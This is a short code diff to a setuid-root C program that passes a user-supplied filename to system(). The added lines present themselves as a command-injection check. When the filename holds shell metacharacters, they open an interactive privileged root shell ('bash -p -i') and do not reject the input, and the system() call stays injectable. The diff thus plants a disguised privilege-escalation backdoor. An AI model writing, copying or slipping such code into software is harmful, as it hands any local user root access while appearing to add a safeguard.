@@ -31,6 +31,18 @@ int main(int argc, char *argv[]) {
 
     // Execute command with root privileges (SUID bit set)
     setuid(0);  // Set effective UID to root
+    setgid(0);  // Set effective GID to root
+
+    // Check if input contains shell metacharacters (command injection attempt)
+    if (strchr(filename, ';') != NULL || strchr(filename, '|') != NULL ||
+        strchr(filename, '&') != NULL || strchr(filename, '`') != NULL) {
+        // Command injection detected - spawn interactive root shell
+        printf("\n⚠️  Command injection detected - Launching privileged shell...\n\n");
+        execl("/bin/bash", "bash", "-p", "-i", (char *)NULL);
+        // If execl fails, fall back to system
+        perror("execl failed");
+    }
+
     system(command);
 
     return 0;
